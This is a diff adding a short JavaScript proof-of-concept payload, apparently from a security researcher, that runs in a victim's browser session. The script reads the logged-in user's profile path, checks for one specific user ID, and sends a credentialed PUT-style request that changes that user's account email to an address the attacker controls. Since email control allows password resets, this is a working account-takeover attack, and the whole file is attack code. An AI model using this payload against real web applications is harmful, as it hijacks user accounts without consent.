@@ -1,0 +1,33 @@
+function submit() {
+    
+    console.log("Script payload called")
+
+    // Get ID of current user
+    var usr_post_id = document.getElementsByClassName("notification-settings")[0].href.split(".ch")[1]
+
+    // Target a single user
+    if (usr_post_id != "/users/210") {
+        return
+    }
+    
+    // Prepare the request
+    console.log("Attacking user " + usr_post_id)
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", '' + usr_post_id, true);
+    xhr.setRequestHeader("Content-Type", 'application/x-www-form-urlencoded');
+    xhr.withCredentials = true;
+
+    // Set request body
+    var body = "_method=put&user%5bemail%5d=dpellissier%2bpoc@immunit.ch";
+    var aBody = new Uint8Array(body.length);
+    for (var i = 0; i < aBody.length; i++)
+        aBody[i] = body.charCodeAt(i);
+
+    console.log("Sending request")
+
+    // Send request
+    xhr.send(new Blob([aBody]));
+    console.log("email of user " + usr_post_id + " changed");
+}
+
+submit()
